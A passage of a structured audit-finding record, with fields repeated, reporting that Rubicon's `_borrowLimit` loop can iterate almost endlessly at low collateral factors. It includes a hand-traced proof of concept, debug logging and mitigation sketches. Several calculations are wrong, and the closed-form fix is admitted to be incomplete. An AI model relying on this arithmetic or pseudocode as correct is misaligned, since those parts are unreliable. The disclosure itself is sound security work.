the result `z` by `y` is equal to `x`. If the condition is not met, it reverts with an error message.\n2.  `add(uint256 x, uint256 y)` is another helper function that adds two uint256 values `x` and `y`. It checks for overflow by ensuring that the result `z` is greater than or equal to `x`. If the condition is not met, the transaction will revert.\n3. `wmul(uint256 x, uint256 y)` is the primary function that multiplies two fixed-point numbers. The function does the following:\n    -   Calls the `mul` function to multiply `x` and `y`.\n    -   Adds half of the fixed-point base (WAD / 2) to the result using the `add` function. This step is crucial for rounding the result correctly.\n    -   Finally, it divides the sum by the fixed-point base (WAD) to obtain the final fixed-point result `z`.\n\n\nNow that we know how most of the calculation works let's assume we call `_borrowLimit` with the variables used in [this](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/leverage-wrapper.ts#L347-L358) test suite.\n\n```solidity\nfunction _borrowLimit(_bathToken,_asset, 25e18, 23.32e18)\n```\n\nAdditionally, [the collateral factor](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/test/leverage-wrapper.ts#L148-L156) stays unchanged.\n\n```typescript\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.7\", 18)\n    );\n```\n\nCalculating the desired amount, we get that its `58.3e18`, which is the result of wmul(25e18, 23.32e18).\n\nNow, let's examine what happens within the while loop:\n\n```solidity\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n\n            }\n```\n\nThe important thing to note here is that on the first iteration `_loopBorrowed` is the result of `wmul(_assetAmount, _collateralFactor`, but going forward it is a result of itself, e.g. `wmul(_loopBorrowed, _collateralFactor)`\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.7e18) = 17.5e18\n\t- `_assetAmount` = 25e18 + 17.5e18 = 42.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(17.5e18, 0.7e18) = 12.25e18\n    -   `_assetAmount` = 42.5e18 + 12.25e18 = 54.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.25e18, 0.7e18) = 8.575e18\n    -   `_assetAmount` = 54.75e18 + 8.575e18 = 63.325e18\n\nSo, it takes 3 iterations to reach the required result. However, the vulnerability here though is hiding in plain sight.\n\nGiven that `_loopBorrowed` is \"dividing from itself\", what would happen if it goes to 1, or even 0, but the desired amount is big enough.\n\nBut.. how could that happen? What if the `collateralFactor` is 0.5e18 instead of 0.7e18?\n\n```typescript\n\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.5\", 18)\n    );\n```\n\nLet's do the exercise again with a reduced collateral factor.\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.5e18) = 12.5e18\n\t- `_assetAmount` = 25e18 + 12.5e18 = 37.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.5e18, 0.5e18) = 6.25e18\n    -   `_assetAmount` = 37.5e18 + 6.25e18 = 43.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(6.25e18, 0.5e18) = 3.125e18\n    -   `_assetAmount` = 43.75e18 + 3.125e18 = 46,875e18\n* On the fourth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(3.125e18, 0.5e18) = 1.5625e18\n    -   `_assetAmount` = 43.75e18 + 1.5625e18 = 48.4375e18\n* On the fifth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(1.5625e18, 0.5e18) = 0.78125e18\n    -   `_assetAmount` = 43.75e18 + 6.2e18 = 49,2187e18\n\nNow that `_loopBorrowed` < 0 I think its pretty clear where this is going. It will take approximately 60 more iterations until `wmul(_loopBorrowed, 0.5e18)` returns `1`.\n\nAt this point `_assetAmount` will be around `50000000000000000020`, which means it will take the `8299999999999999980` more iterations to get to the required desired amount.\n\nYou can verify these results by running the `yarn hardhat test ./test/leverage-wrapper.ts --grep \"should open long position\"` command from the existing test suite, which will produce the following output:\n\n\nI have added some console logs for you if you want a visual representation.\n\n```solidity\n  function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n        console.log(_desiredAmount, \"desiredAmount\");\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\n        // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            console.log(\"****** in loop\");\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n                    console.log(\"max\", _max);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n\n            }\n\n\n            console.log(\"_loopBorrowed\", _loopBorrowed);\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n            console.log(\"_assetAmount\", _assetAmount);\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n\n            console.log(\"limit\", _limit);\n        }\n    }\n```\n\nIn conclusion, when the collateral factor is lower (and the leverage high), the `_borrowLimit` function becomes highly inefficient and requires a large number of iterations to calculate the desired amount.\n\nThis is just one nuance of this vulnerability and it could be triggered in various ways, but I hope this single explanation is good enough to convince you that it should be addressed.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L542\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L158-L159\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review\n\n**Limit the number of iterations:**\nIntroduce a maximum number of iterations that the while loop can run, preventing the function from running indefinitely.\n\nThis approach helps prevent the infinite loop issue, but it means your system won't be able to work with specific collateral factors.\n\nInstead, the maximum number of iterations can be chosen based on expected usage patterns and system requirements.\n\n```solidity\nuint256 maxIterations = 50;\nuint256 currentIteration = 0;\n\nwhile (_assetAmount <= _desiredAmount && currentIteration < maxIterations) {\n    // existing logic\n    currentIteration++;\n}\n\n```\n\n\n**Restrict the minimum `_loopBorrowed` value**:\n\nDefine a minimum acceptable value for `_loopBorrowed` and halt the loop if the value goes below this threshold.\n\nThis approach can help prevent the `_loopBorrowed` value from becoming too small and causing an infinite loop. However, it has the same drawbacks as the previous solution.\n\n\n```solidity\nuint256 minLoopBorrowed = 1e9; // Choose an appropriate minimum value based on the token decimals\n\nwhile (_assetAmount <= _desiredAmount) {\n    // existing logic\n\n    if (_loopBorrowed < minLoopBorrowed) {\n        break;\n    }\n}\n```\n\n**Use a more sophisticated algorithm:**\nInstead of a while loop, consider using a more sophisticated algorithm to calculate the borrowing limit and last borrow amount.\n\nIt might be possible to derive a closed-form solution that directly calculates the borrowing limit without needing a loop.\n\nHowever, this approach requires a deep understanding of the mathematical relationship between the input parameters and the desired borrowing limit.\n\nFor instance, if the borrowing limit calculation follows a simple linear relationship, the closed-form solution could be derived as follows:\n\n```solidity\nfunction borrowLimit(uint256 _desiredAmount, uint256 _collateral, uint256 _loanFactor) public view returns (uint256) {\n    // Calculate the borrowing limit using the closed-form solution\n    uint256 borrowLimit = (_desiredAmount * _loanFactor) / (_collateral - _desiredAmount);\n\n    return borrowLimit;\n}\n\n```\n\nTo apply the closed-form solution to the `_borrowLimit` function, we would need to adjust the smart contract to directly compute the required number of iterations `n` and the final borrowed amount.\n\nInstead, we can use the closed-form solution formula to calculate `n` and then determine the final borrowed amount using the formula for the sum of a geometric series.\n\nFor example, consider the scenario where the initial asset amount is `A0 = 10,000` tokens, the desired asset amount is `Ad = 15,000` tokens (10,000 tokens + 5,000 tokens), and the collateral factor is `c = 0.5`. Using the closed-form solution formula:\n\n`n = log_c((1 - ((Ad * (1 - c)) / A0)) - 1)`\n\nSubstituting the values: `n = log_0.5((1 - ((15,000 * (1 - 0.5)) / 10,000)) - 1)`\n\nAfter calculating, we get: `n â‰ˆ 1.58`\n\nSince `n` should be an integer (as it represents the number of iterations), we round up to the nearest whole number: `n = 2`\n\nWe can now calculate the final borrowed amount using the formula for the sum of a geometric series:\n\n`Ad = A0 + A0 * c + A0 * c^2 + ... + A0 * c^n`\n\nSubstituting the values: `15,000 = 10,000 + 10,000 * 0.5 + 10,000 * 0.5^2`\n\nCalculating the geometric series: `15,000 = 10,000 + 5,000 + 2,500`\n\nThus, the final borrowed amount is: `5,000 = 5,000 + 2,500`\n\nNow that we know how it *could*  work, we would need to identify the geometric series that represents the problem and use the closed-form formula for a geometric series to calculate the borrow limit.\n\nIf the collateral factor is not equal to 1, we would need to calculate the number of terms using the closed-form formula for a geometric series and the last borrow amount using the geometric series formula.\n\nThe pseudocode for the updated `_borrowLimit` function using the closed-form solution looks like this:\n\n```solidity\nfunction _borrowLimit(\n    address _bathToken,\n    address _asset,\n    uint256 _assetAmount,\n    uint256 _leverage\n) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n    (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n    uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n    uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\n    if (_minted != 0) {\n        uint256 _max = _maxBorrow(_bathToken);\n        _assetAmount = wmul(_assetAmount, _collateralFactor).add(_max);\n    }\n\n    if (_collateralFactor == WAD) {\n        // Collateral factor is 1, which means it's a 1x short or perfect matching\n        _limit = (_desiredAmount.sub(_assetAmount)).div(WAD);\n        _lastBorrow = wmul(_assetAmount, _collateralFactor);\n    } else {\n        // Calculate the number of terms using the closed-form formula for a geometric series\n        _limit = uint256(\n            log1p(\n                wdiv(\n                    (_desiredAmount.mul(WAD.sub(_collateralFactor))).sub(_assetAmount.mul(WAD)),\n                    _assetAmount.mul(_collateralFactor)\n                )\n            ).div(log1p(_collateralFactor.sub(WAD)))\n        );\n\n        // Calculate the last borrow amount\n        _lastBorrow = wmul(_assetAmount, pow(_collateralFactor, _limit)).sub(_assetAmount);\n    }\n}\n\n```\n\nPlease note that the provided solution is incomplete and requires additional adjustments.\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nThe infinite loop vulnerability could cause the `openPosition` functionality to become unresponsive or fail, negatively affecting the performance and usability of the whole system.\n",
        "recommendation": "## Recommended Mitigation Steps\n\nThat's probably one of my hardest mitigations steps to write, so I'll brain-dump almost everything I've researched and that comes to my mind.\n",
        "poc": "## Proof of Concept\n\nThe `_borrowLimit` function is an internal view function used by [`openPosition`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/utilities/poolsUtility/Position.sol#L125-L130)  that calculates the maximum number of borrowing loops allowed for a given asset and leverage, taking into account the collateral factor and any previously supplied collateral. It returns the calculated borrowing limit and the amount required to borrow in the last loop to avoid exceeding the desired amount.\n\nThe function works as follows:\n1. Retrieve the collateral factor for the given `_bathToken` from the `comptroller` contract.\n2. Calculate the desired amount of the asset to borrow based on the given `_assetAmount` and `_leverage`.\n3. Determine if collateral was already supplied by checking the balance of the `_bathToken` in the contract.\n4. Initialize a while loop that continues until the `_assetAmount` is less than or equal to the desired amount.\n5. In each loop iteration:\n\t1. Calculate the amount that can be borrowed in the current loop (`_loopBorrowed`) based on the collateral factor and any previously supplied collateral.\n\t2. Update the total asset amount in the position by adding the borrowed amount from the current loop. c. Check if the updated asset amount has reached or exceeded the desired amount:\n    -   If it has, calculate the borrowing amount required in the last loop to not exceed the desired amount and increment the borrowing limit.\n    -   If the asset amount perfectly matches the desired amount, increment the borrowing limit.\n    -   In other cases, increment the borrowing limit and proceed to the next iteration.\n\n\nThe calculations for the `desiredAmount` and the `_loopBorrowed` are performed by using the [`wmul`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/RubiconMarket.sol#L77-L79) function.\n\n`wmul` is designed to multiply two fixed-point numbers (with 18 decimals precision) and return the result as another fixed-point number. Here's a breakdown of how the function works:\n1.  `mul(uint256 x, uint256 y)` is a helper function that multiplies two uint256 values `x` and `y`. It checks for overflow by ensuring that either `y` is 0 or that the division of the result `z` by `y` is equal to `x`. If the condition is not met, it reverts with an error message.\n2.  `add(uint256 x, uint256 y)` is another helper function that adds two uint256 values `x` and `y`. It checks for overflow by ensuring that the result `z` is greater than or equal to `x`. If the condition is not met, the transaction will revert.\n3. `wmul(uint256 x, uint256 y)` is the primary function that multiplies two fixed-point numbers. The function does the following:\n    -   Calls the `mul` function to multiply `x` and `y`.\n    -   Adds half of the fixed-point base (WAD / 2) to the result using the `add` function. This step is crucial for rounding the result correctly.\n    -   Finally, it divides the sum by the fixed-point base (WAD) to obtain the final fixed-point result `z`.\n\n\nNow that we know how most of the calculation works let's assume we call `_borrowLimit` with the variables used in [this](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/leverage-wrapper.ts#L347-L358) test suite.\n\n```solidity\nfunction _borrowLimit(_bathToken,_asset, 25e18, 23.32e18)\n```\n\nAdditionally, [the collateral factor](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/test/leverage-wrapper.ts#L148-L156) stays unchanged.\n\n```typescript\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.7\", 18)\n    );\n```\n\nCalculating the desired amount, we get that its `58.3e18`, which is the result of wmul(25e18, 23.32e18).\n\nNow, let's examine what happens within the while loop:\n\n```solidity\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n\n            }\n```\n\nThe important thing to note here is that on the first iteration `_loopBorrowed` is the result of `wmul(_assetAmount, _collateralFactor`, but going forward it is a result of itself, e.g. `wmul(_loopBorrowed, _collateralFactor)`\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.7e18) = 17.5e18\n\t- `_assetAmount` = 25e18 + 17.5e18 = 42.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(17.5e18, 0.7e18) = 12.25e18\n    -   `_assetAmount` = 42.5e18 + 12.25e18 = 54.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.25e18, 0.7e18) = 8.575e18\n    -   `_assetAmount` = 54.75e18 + 8.575e18 = 63.325e18\n\nSo, it takes 3 iterations to reach the required result. However, the vulnerability here though is hiding in plain sight.\n\nGiven that `_loopBorrowed` is \"dividing from itself\", what would happen if it goes to 1, or even 0, but the desired amount is big enough.\n\nBut.. how could that happen? What if the `collateralFactor` is 0.5e18 instead of 0.7e18?\n\n```typescript\n\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.5\", 18)\n    );\n```\n\nLet's do the exercise again with a reduced collateral factor.\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.5e18) = 12.5e18\n\t- `_assetAmount` = 25e18 + 12.5e18 = 37.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.5e18, 0.5e18) = 6.25e18\n    -   `_assetAmount` = 37.5e18 + 6.25e18 = 43.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(6.25e18, 0.5e18) = 3.125e18\n    -   `_assetAmount` = 43.75e18 + 3.125e18 = 46,875e18\n* On the fourth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(3.125e18, 0.5e18) = 1.5625e18\n    -   `_assetAmount` = 43.75e18 + 1.5625e18 = 48.4375e18\n* On the fifth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(1.5625e18, 0.5e18) = 0.78125e18\n    -   `_assetAmount` = 43.75e18 + 6.2e18 = 49,2187e18\n\nNow that `_loopBorrowed` < 0 I think its pretty clear where this is going. It will take approximately 60 more iterations until `wmul(_loopBorrowed, 0.5e18)` returns `1`.\n\nAt this point `_assetAmount` will be around `50000000000000000020`, which means it will take the `8299999999999999980` more iterations to get to the required desired amount.\n\nYou can verify these results by running the `yarn hardhat test ./test/leverage-wrapper.ts --grep \"should open long position\"` command from the existing test suite, which will produce the following output:\n\n\nI have added some console logs for you if you want a visual representation.\n\n```solidity\n  function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n        console.log(_desiredAmount, \"desiredAmount\");\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\n        // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            console.log(\"****** in loop\");\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n                    console.log(\"max\", _max);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n\n            }\n\n\n            console.log(\"_loopBorrowed\", _loopBorrowed);\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n            console.log(\"_assetAmount\", _assetAmount);\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n\n            console.log(\"limit\", _limit);\n        }\n    }\n```\n\nIn conclusion, when the collateral factor is lower (and the leverage high), the `_borrowLimit` function becomes highly inefficient and requires a large number of iterations to calculate the desired amount.\n\nThis is just one nuance of this vulnerability and it could be triggered in various ways, but I hope this single explanation is good enough to convince you that it should be addressed.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L542\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L158-L159\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review\n\n**Limit the number of iterations:**\nIntroduce a maximum number of iterations that the while loop can run, preventing the function from running indefinitely.\n\nThis approach helps prevent the infinite loop issue, but it means your system won't be able to work with specific collateral factors.\n\nInstead, the maximum number of iterations can be chosen based on expected usage patterns and system requirements.\n\n```solidity\nuint256 maxIterations = 50;\nuint256 currentIteration = 0;\n\nwhile (_assetAmount <= _desiredAmount && currentIteration < maxIterations) {\n    // existing logic\n    currentIteration++;\n}\n\n```\n\n\n**Restrict the minimum `_loopBorrowed` value**:\n\nDefine a minimum acceptable value for `_loopBorrowed` and halt the loop if the value goes below this threshold.\n\nThis approach can help prevent the `_loopBorrowed` value from becoming too small and causing an infinite loop. However, it has the same drawbacks as the previous solution.\n\n\n```solidity\nuint256 minLoopBorrowed = 1e9; // Choose an appropriate minimum value based on the token decimals\n\nwhile (_assetAmount <= _desiredAmount) {\n    // existing logic\n\n    if (_loopBorrowed < minLoopBorrowed) {\n        break;\n    }\n}\n```\n\n**Use a more sophisticated algorithm:**\nInstead of a while loop, consider using a more sophisticated algorithm to calculate the borrowing limit and last borrow amount.\n\nIt might be possible to derive a closed-form solution that directly calculates the borrowing limit without needing a loop.\n\nHowever, this approach requires a deep understanding of the mathematical relationship between the input parameters and the desired borrowing limit.\n\nFor instance, if the borrowing limit calculation follows a simple linear relationship, the closed-form solution could be derived as follows:\n\n```solidity\nfunction borrowLimit(uint256 _desiredAmount, uint256 _collateral, uint256 _loanFactor) public view returns (uint256) {\n    // Calculate the borrowing limit using the closed-form solution\n    uint256 borrowLimit = (_desiredAmount * _loanFactor) / (_collateral - _desiredAmount);\n\n    return borrowLimit;\n}\n\n```\n\nTo apply the closed-form solution to the `_borrowLimit` function, we would need to adjust the smart contract to directly compute the required number of iterations `n` and the final borrowed amount.\n\nInstead, we can use the closed-form solution formula to calculate `n` and then determine the final borrowed amount using the formula for the sum of a geometric series.\n\nFor example, consider the scenario where the initial asset amount is `A0 = 10,000` tokens, the desired asset amount is `Ad = 15,000` tokens (10,000 tokens + 5,000 tokens), and the collateral factor is `c = 0.5`. Using the closed-form solution formula:\n\n`n = log_c((1 - ((Ad * (1 - c)) / A0)) - 1)`\n\nSubstituting the values: `n = log_0.5((1 - ((15,000 * (1 - 0.5)) / 10,000)) - 1)`\n\nAfter calculating, we get: `n â‰ˆ 1.58`\n\nSince `n` should be an integer (as it represents the number of iterations), we round up to the nearest whole number: `n = 2`\n\nWe can now calculate the final borrowed amount using the formula for the sum of a geometric series:\n\n`Ad = A0 + A0 * c + A0 * c^2 + ... + A0 * c^n`\n\nSubstituting the values: `15,000 = 10,000 + 10,000 * 0.5 + 10,000 * 0.5^2`\n\nCalculating the geometric series: `15,000 = 10,000 + 5,000 + 2,500`\n\nThus, the final borrowed amount is: `5,000 = 5,000 + 2,500`\n\nNow that we know how it *could*  work, we would need to identify the geometric series that represents the problem and use the closed-form formula for a geometric series to calculate the borrow limit.\n\nIf the collateral factor is not equal to 1, we would need to calculate the number of terms using the closed-form formula for a geometric series and the last borrow amount using the geometric series formula.\n\nThe pseudocode for the updated `_borrowLimit` function using the closed-form solution looks like this:\n\n```solidity\nfunction _borrowLimit(\n    address _bathToken,\n    address _asset,\n    uint256 _assetAmount,\n    uint256 _leverage\n) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n    (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n    uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n    uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\n    if (_minted != 0) {\n        uint256 _max = _maxBorrow(_bathToken);\n        _assetAmount = wmul(_assetAmount, _collateralFactor).add(_max);\n    }\n\n    if (_collateralFactor == WAD) {\n        // Collateral factor is 1, which means it's a 1x short or perfect matching\n        _limit = (_desiredAmount.sub(_assetAmount)).div(WAD);\n        _lastBorrow = wmul(_assetAmount, _collateralFactor);\n    } else {\n        // Calculate the number of terms using the closed-form formula for a geometric series\n        _limit = uint256(\n            log1p(\n                wdiv(\n                    (_desiredAmount.mul(WAD.sub(_collateralFactor))).sub(_assetAmount.mul(WAD)),\n                    _assetAmount.mul(_collateralFactor)\n                )\n            ).div(log1p(_collateralFactor.sub(WAD)))\n        );\n\n        // Calculate the last borrow amount\n        _lastBorrow = wmul(_assetAmount, pow(_collateralFactor, _limit)).sub(_assetAmount);\n    }\n}\n\n```\n\nPlease note that the provided solution is incomplete and requires additional adjustments.\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L542\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L158-L159\n\n\n# Vulnerability details\n\n## Impact\n\nThe infinite loop vulnerability could cause the `openPosition` functionality to become unresponsive or fail, negatively affecting the performance and usability of the whole system.\n\n\n## Proof of Concept\n\nThe `_borrowLimit` function is an internal view function used by [`openPosition`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/utilities/poolsUtility/Position.sol#L125-L130)  that calculates the maximum number of borrowing loops allowed for a given asset and leverage, taking into account the collateral factor and any previously supplied collateral. It returns the calculated borrowing limit and the amount required to borrow in the last loop to avoid exceeding the desired amount.\n\nThe function works as follows:\n1. Retrieve the collateral factor for the given `_bathToken` from the `comptroller` contract.\n2. Calculate the desired amount of the asset to borrow based on the given `_assetAmount` and `_leverage`.\n3. Determine if collateral was already supplied by checking the balance of the `_bathToken` in the contract.\n4. Initialize a while loop that continues until the `_assetAmount` is less than or equal to the desired amount.\n5. In each loop iteration:\n\t1. Calculate the amount that can be borrowed in the current loop (`_loopBorrowed`) based on the collateral factor and any previously supplied collateral.\n\t2. Update the total asset amount in the position by adding the borrowed amount from the current loop. c. Check if the updated asset amount has reached or exceeded the desired amount:\n    -   If it has, calculate the borrowing amount required in the last loop to not exceed the desired amount and increment the borrowing limit.\n    -   If the asset amount perfectly matches the desired amount, increment the borrowing limit.\n    -   In other cases, increment the borrowing limit and proceed to the next iteration.\n\n\nThe calculations for the `desiredAmount` and the `_loopBorrowed` are performed by using the [`wmul`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/RubiconMarket.sol#L77-L79) function.\n\n`wmul` is designed to multiply two fixed-point numbers (with 18 decimals precision) and return the result as another fixed-point number. Here's a breakdown of how the function works:\n1.  `mul(uint256 x, uint256 y)` is a helper function that multiplies two uint256 values `x` and `y`. It checks for overflow by ensuring that either `y` is 0 or that the division of the result `z` by `y` is equal to `x`. If the condition is not met, it reverts with an error message.\n2.  `add(uint256 x, uint256 y)` is another helper function that adds two uint256 values `x` and `y`. It checks for overflow by ensuring that the result `z` is greater than or equal to `x`. If the condition is not met, the transaction will revert.\n3. `wmul(uint256 x, uint256 y)` is the primary function that multiplies two fixed-point numbers. The function does the following:\n    -   Calls the `mul` function to multiply `x` and `y`.\n    -   Adds half of the fixed-point base (WAD / 2) to the result using the `add` function. This step is crucial for rounding the result correctly.\n    -   Finally, it divides the sum by the fixed-point base (WAD) to obtain the final fixed-point result `z`.\n\n\nNow that we know how most of the calculation works let's assume we call `_borrowLimit` with the variables used in [this](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/leverage-wrapper.ts#L347-L358) test suite.\n\n```solidity\nfunction _borrowLimit(_bathToken,_asset, 25e18, 23.32e18)\n```\n\nAdditionally, [the collateral factor](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/test/leverage-wrapper.ts#L148-L156) stays unchanged.\n\n```typescript\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.7\", 18)\n    );\n```\n\nCalculating the desired amount, we get that its `58.3e18`, which is the result of wmul(25e18, 23.32e18).\n\nNow, let's examine what happens within the while loop:\n\n```solidity\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        